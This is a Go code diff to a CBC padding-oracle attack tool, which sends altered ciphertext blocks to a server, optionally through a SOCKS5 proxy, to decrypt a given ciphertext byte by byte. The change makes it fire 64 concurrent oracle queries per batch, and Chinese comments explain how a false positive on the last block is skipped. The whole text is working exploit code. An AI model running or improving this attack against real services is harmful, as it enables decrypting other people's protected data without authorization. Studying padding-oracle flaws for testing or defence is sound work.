@@ -10,11 +10,20 @@ import (
 	"os"
 )
 
+const (
+	CONCURRENT_NUM = 64
+)
+
 var (
 	httpClient *http.Client
 	socks5Flag = flag.String("s5", "", "Specify a socks5 proxy to be used, format: \"address:port\"")
 	cipherText = flag.String("ct", "", "Cipher text to be decypted.")
 )
+
+type returnData struct {
+	_id byte
+	res bool
+}
 
 // return true when the padding is valid
 func isPaddingValid(cipherText string) bool {
@@ -54,6 +63,7 @@ func setupHttpClient(socks5Address string) error {
 func decryptUsingCBCPaddingOracle(twoCipherBlocks []byte, onePlainBlock []byte, lastBlock bool) error {
 	tempBlocks := make([]byte, len(twoCipherBlocks))
 	copy(tempBlocks, twoCipherBlocks)
+	resChan := make(chan returnData, CONCURRENT_NUM)
 	for i := 15; i >= 0; i-- {
 		log.Printf("  byte in block %d\n", i)
 		pad := byte(16 - i)
@@ -61,17 +71,36 @@ func decryptUsingCBCPaddingOracle(twoCipherBlocks []byte, onePlainBlock []byte, 
 			tempBlocks[k] = twoCipherBlocks[k] ^ onePlainBlock[k] ^ pad
 		}
 		j := 0
-		for ; j < 256; j++ {
-			log.Printf("    test for byte %d\n", j)
-			//因为last block在i==15和j==1时，就是没有修改的block，自然padding是对的，
-			//但是因为我只传了最后2个block给服务器，所以验证是错误的，所以也会返回404错误，
-			//这就误判了，所以要跳过这个步骤
-			if lastBlock && i == 15 && j == 1 {
-				continue
+		for j < 256 {
+			waitValues := 0
+			for k := 0; k < CONCURRENT_NUM && j < 256; k++ {
+				log.Printf("    test for byte %d\n", j)
+				//因为last block在i==15和j==1时，就是没有修改的block，自然padding是对的，
+				//但是因为我只传了最后2个block给服务器，所以验证是错误的，所以也会返回404错误，
+				//这就误判了，所以要跳过这个步骤
+				if lastBlock && i == 15 && j == 1 {
+					j++
+					continue
+				}
+
+				tempBlocks[i] = twoCipherBlocks[i] ^ byte(j) ^ pad
+
+				waitValues++
+				go concurrentCheckValid(resChan, hex.EncodeToString(tempBlocks), byte(j))
+				j++
 			}
-			tempBlocks[i] = twoCipherBlocks[i] ^ byte(j) ^ pad
-			if isPaddingValid(hex.EncodeToString(tempBlocks)) {
-				onePlainBlock[i] = byte(j)
+
+			//get result from chan
+			bFinished := false
+			for k := 0; k < waitValues; k++ {
+				resData := <-resChan
+				if !bFinished && resData.res {
+					onePlainBlock[i] = resData._id
+					bFinished = true
+				}
+			}
+
+			if bFinished {
 				break
 			}
 		}
@@ -105,6 +134,10 @@ func decryptCipherText(cipherText []byte) ([]byte, error) {
 	}
 
 	return dstBytes, nil
+}
+
+func concurrentCheckValid(returnChan chan returnData, cipherText string, _id byte) {
+	returnChan <- returnData{_id: _id, res: isPaddingValid(cipherText)}
 }
 
 func main() {
